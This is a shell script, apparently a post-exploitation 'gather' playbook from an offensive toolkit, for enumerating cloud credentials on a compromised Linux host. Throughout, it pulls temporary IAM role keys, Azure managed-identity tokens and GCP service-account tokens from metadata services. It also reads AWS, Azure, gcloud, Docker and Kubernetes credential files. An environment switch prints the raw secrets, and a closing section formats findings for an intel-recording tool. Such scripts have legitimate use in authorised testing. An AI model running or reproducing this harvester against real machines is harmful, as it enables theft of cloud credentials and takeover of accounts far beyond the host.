#!/bin/sh
# gather/linux/enum-cloud-credentials.sh — Cloud credential and identity enumeration
# Requires: Any user (root gets more; IMDS accessible from instance)
# Read-only: YES — read-only queries only
# Sensitive-output: YES — redacted by default; set BRJOTSKEL_REVEAL_SECRETS=1 to print raw material
# Footprint: Zero (no temp files)
# Purpose: Detect attached cloud identities, IAM roles, static keys, and token expiry
#          A compromised cloud instance may have an attached role with blast radius
#          far beyond the instance itself.
#
# Covers: AWS EC2, Azure VM, GCP Compute Engine
#
# Run inline: remote_exec(session="host01", command="<paste>")

set -u

sec(){ printf '\n=== %s ===\n' "$1"; }

CURL_TIMEOUT=2
REVEAL_SECRETS="${BRJOTSKEL_REVEAL_SECRETS:-0}"

redact_stream() {
  if [ "$REVEAL_SECRETS" = "1" ]; then
    cat
  else
    sed -E \
      -e 's/(aws_secret_access_key[[:space:]]*=[[:space:]]*)[^[:space:]]+/\1<redacted>/Ig' \
      -e 's/(aws_session_token[[:space:]]*=[[:space:]]*)[^[:space:]]+/\1<redacted>/Ig' \
      -e 's/("SecretAccessKey"[[:space:]]*:[[:space:]]*")[^"]+/\1<redacted>/Ig' \
      -e 's/("Token"[[:space:]]*:[[:space:]]*")[^"]+/\1<redacted>/Ig' \
      -e 's/("access_token"[[:space:]]*:[[:space:]]*")[^"]+/\1<redacted>/Ig' \
      -e 's/("refresh_token"[[:space:]]*:[[:space:]]*")[^"]+/\1<redacted>/Ig' \
      -e 's/(token[[:space:]]*[=:][[:space:]]*)[^[:space:]",]+/\1<redacted>/Ig' \
      -e 's/(password[[:space:]]*[=:][[:space:]]*)[^[:space:]",]+/\1<redacted>/Ig' \
      -e 's/(auth[[:space:]]*"?[[:space:]]*:[[:space:]]*")[^"]+/\1<redacted>/Ig'
  fi
}

show_secret_file() {
  f="$1"
  if [ "$REVEAL_SECRETS" = "1" ]; then
    cat "$f" 2>/dev/null
  else
    printf '[REDACTED] %s present; set BRJOTSKEL_REVEAL_SECRETS=1 to print raw material\n' "$f"
    sed -n '1,20p' "$f" 2>/dev/null | redact_stream
  fi
}

show_token_file_meta() {
  f="$1"
  if [ "$REVEAL_SECRETS" = "1" ]; then
    head -c 200 "$f" 2>/dev/null
  else
    printf '[REDACTED] token file present: %s\n' "$f"
    wc -c "$f" 2>/dev/null | awk '{print "bytes: " $1}'
    sha256sum "$f" 2>/dev/null | awk '{print "sha256: " $1}'
  fi
}

# Quick connectivity test to IMDS
try_curl() {
  curl -sf --connect-timeout "$CURL_TIMEOUT" --max-time "$CURL_TIMEOUT" \
    -H "${2:-}" "$1" 2>/dev/null
}

sec 'CLOUD CREDENTIAL ENUMERATION HEADER'
printf 'Host:      %s\n' "$(hostname 2>/dev/null)"
printf 'Timestamp: %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
printf 'Secret output: %s\n' "$([ "$REVEAL_SECRETS" = "1" ] && echo 'REVEAL enabled' || echo 'REDACTED; set BRJOTSKEL_REVEAL_SECRETS=1 to reveal raw tokens/keys')"

sec 'ENVIRONMENT DETECTION'
# Detect cloud provider from DMI/hypervisor hints
echo "--- DMI product name ---"
cat /sys/class/dmi/id/product_name 2>/dev/null || echo "(not available)"
echo "--- Bios vendor ---"
cat /sys/class/dmi/id/bios_vendor 2>/dev/null || echo "(not available)"
echo "--- Hypervisor ---"
dmesg 2>/dev/null | grep -i 'hypervisor\|vmware\|xen\|kvm\|amazon\|azure\|google' | head -5 || true
systemd-detect-virt 2>/dev/null && true

sec 'AWS EC2 — INSTANCE METADATA SERVICE (IMDSv1/v2)'
# Try IMDSv2 first (requires token), fall back to IMDSv1
AWS_TOKEN=$(try_curl "http://169.254.169.254/latest/api/token" \
  "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || true)

if [ -n "$AWS_TOKEN" ]; then
  echo "[INFO] IMDSv2 token obtained"
  IMDS_CURL="curl -sf --connect-timeout $CURL_TIMEOUT -H X-aws-ec2-metadata-token:$AWS_TOKEN"
else
  IMDS_CURL="curl -sf --connect-timeout $CURL_TIMEOUT"
fi

# Identity document
echo "--- Identity document ---"
$IMDS_CURL http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null || \
  echo "(IMDS not reachable — not EC2, or IMDS disabled)"

# IAM role name
echo "--- Attached IAM role ---"
IAM_ROLE=$($IMDS_CURL http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
if [ -n "$IAM_ROLE" ]; then
  printf '[!] IAM ROLE ATTACHED: %s\n' "$IAM_ROLE"
  echo "--- Role credentials (temporary keys) ---"
  creds=$($IMDS_CURL "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE" 2>/dev/null)
  printf '%s\n' "$creds" | redact_stream
  # Extract and highlight expiry
  expiry=$(printf '%s' "$creds" | grep -o '"Expiration" : "[^"]*"' | cut -d'"' -f4)
  [ -n "$expiry" ] && printf '[!] Token expires: %s\n' "$expiry"
else
  echo "(no IAM role attached, or IMDS not reachable)"
fi

sec 'AWS — STATIC CREDENTIALS'
# Environment variables
echo "--- AWS environment variables ---"
env | grep -E '^AWS_' | grep -v '^$' | redact_stream || echo "(none in environment)"

# Credential files
echo "--- ~/.aws/credentials ---"
for home in /root /home/*; do
  f="$home/.aws/credentials"
  [ -f "$f" ] && printf -- '--- %s ---\n' "$f" && show_secret_file "$f"
done

echo "--- ~/.aws/config ---"
for home in /root /home/*; do
  f="$home/.aws/config"
  [ -f "$f" ] && printf -- '--- %s ---\n' "$f" && show_secret_file "$f"
done

# ECS task metadata (may have task role creds)
echo "--- ECS container metadata (if applicable) ---"
if [ -n "${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-}" ]; then
  printf '[!] ECS_RELATIVE_URI: %s\n' "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  try_curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" | redact_stream || true
fi

sec 'AZURE — INSTANCE METADATA SERVICE'
echo "--- Azure IMDS identity ---"
try_curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  "Metadata: true" | head -30 || echo "(not Azure IMDS, or not reachable)"

echo "--- Azure managed identity token ---"
msi=$(try_curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  "Metadata: true" 2>/dev/null)
if [ -n "$msi" ]; then
  printf '[!] MANAGED IDENTITY TOKEN OBTAINED\n'
  printf '%s\n' "$msi" | head -5 | redact_stream
  expiry=$(printf '%s' "$msi" | grep -o '"expires_on":"[^"]*"' | cut -d'"' -f4)
  [ -n "$expiry" ] && printf '[!] Token expires_on: %s (unix timestamp)\n' "$expiry"
else
  echo "(no managed identity, or not Azure)"
fi

# Azure CLI tokens
echo "--- Azure CLI token cache ---"
for home in /root /home/*; do
  d="$home/.azure/accessTokens.json"
  [ -f "$d" ] && printf '[!] Azure CLI tokens: %s\n' "$d" && sed -n '1,3p' "$d" | redact_stream
done

sec 'GCP — METADATA SERVICE'
echo "--- GCP instance identity ---"
try_curl "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true" \
  "Metadata-Flavor: Google" | head -20 || echo "(not GCP, or metadata not reachable)"

echo "--- GCP service account ---"
sa=$(try_curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
  "Metadata-Flavor: Google" 2>/dev/null)
if [ -n "$sa" ]; then
  printf '[!] SERVICE ACCOUNT: %s\n' "$sa"
  echo "--- GCP service account token ---"
  token=$(try_curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/${sa%/}/token" \
    "Metadata-Flavor: Google" 2>/dev/null)
  printf '%s\n' "$token" | head -3 | redact_stream
  expiry=$(printf '%s' "$token" | grep -o '"expires_in":[0-9]*' | cut -d: -f2)
  [ -n "$expiry" ] && printf '[!] Token expires in: %s seconds\n' "$expiry"
else
  echo "(no service account, or not GCP)"
fi

echo "--- GCP ADC credentials ---"
for home in /root /home/*; do
  for f in "$home/.config/gcloud/application_default_credentials.json" \
            "$home/.config/gcloud/credentials.db"; do
    [ -f "$f" ] && printf '[!] GCP ADC: %s\n' "$f" && sed -n '1,5p' "$f" | redact_stream
  done
done

sec 'GENERIC — OTHER CREDENTIAL SOURCES'
echo "--- Docker config credentials ---"
for home in /root /home/*; do
  f="$home/.docker/config.json"
  [ -f "$f" ] && printf -- '--- %s ---\n' "$f" && show_secret_file "$f"
done

echo "--- Kubernetes service account token ---"
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  printf '[!] K8s service account token present\n'
  show_token_file_meta /var/run/secrets/kubernetes.io/serviceaccount/token
  echo ""
  cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
fi

sec 'RECORDING GUIDANCE'
echo "IAM role / cloud identity credential:"
echo "  intel_add(category=\"credential\", id=\"<cloud-role-id>\","
echo "    data=\"type: token\\nusername: <role-name>\\nsecret: <access-key-id>/<token>\\n"
echo "          status: active\\nnotes: IAM role attached — blast radius is the role policies\\n"
echo "          source:\\n  host: $(hostname)\\n  method: cloud IMDS\\n  playbook: linux/enum-cloud-credentials.sh\","
echo "    summary=\"IAM role <role-name> attached to $(hostname)\")"
